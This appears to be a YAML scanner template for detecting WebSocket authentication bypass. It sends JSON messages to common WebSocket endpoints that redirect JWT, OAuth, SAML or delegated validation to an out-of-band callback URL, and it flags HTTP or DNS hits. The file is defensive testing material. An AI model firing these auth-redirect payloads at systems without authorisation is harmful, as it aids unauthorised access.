id: websocket-auth-bypass-oob

info:
  name: WebSocket Authentication Bypass External Callback OOB
  author: geeknik
  severity: high
  description: |
    Detects WebSocket authentication mechanisms that can be bypassed through external
    callback URLs, JWT validation endpoints, OAuth redirects, or authentication
    delegation to external services that can be controlled by an attacker.
  reference:
    - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
    - https://tools.ietf.org/html/rfc6455#section-10
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 9.3
    cwe-id: CWE-287
  tags: websocket,oob,auth-bypass,jwt,oauth,delegation

variables:
  callback_url: "{{interactsh-url}}"

websocket:
  - address: "{{BaseURL}}"
    path:
      - "/ws"
      - "/websocket"
      - "/socket.io/"
      - "/api/ws"

    inputs:
      - data: |
          {
            "type": "auth",
            "auth_type": "external",
            "validation_url": "{{callback_url}}/validate",
            "callback_url": "{{callback_url}}/auth-success"
          }
      - data: |
          {
            "action": "jwt_auth",
            "jwt_issuer": "{{callback_url}}",
            "validation_endpoint": "{{callback_url}}/jwt/validate",
            "jwks_uri": "{{callback_url}}/.well-known/jwks.json"
          }
      - data: |
          {
            "command": "oauth_setup",
            "oauth_provider": "{{callback_url}}",
            "authorization_url": "{{callback_url}}/oauth/authorize",
            "token_url": "{{callback_url}}/oauth/token",
            "redirect_uri": "{{callback_url}}/oauth/callback"
          }

  - address: "{{BaseURL}}"
    path:
      - "/ws/auth"
      - "/websocket/authenticate"
      - "/api/ws/login"

    inputs:
      - data: |
          {
            "type": "delegate_auth",
            "auth_delegate": "{{callback_url}}/auth",
            "user_info_url": "{{callback_url}}/userinfo",
            "trust_external": true,
            "callback_on_success": "{{callback_url}}/authenticated"
          }
      - data: |
          {
            "action": "saml_auth",
            "saml_idp": "{{callback_url}}",
            "sso_url": "{{callback_url}}/saml/sso",
            "metadata_url": "{{callback_url}}/saml/metadata",
            "acs_url": "{{callback_url}}/saml/acs"
          }
      - data: |
          {
            "command": "bypass_auth",
            "external_validator": "{{callback_url}}/bypass",
            "callback_url": "{{callback_url}}/bypassed"
          }

matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "http"
      - "dns"
    condition: or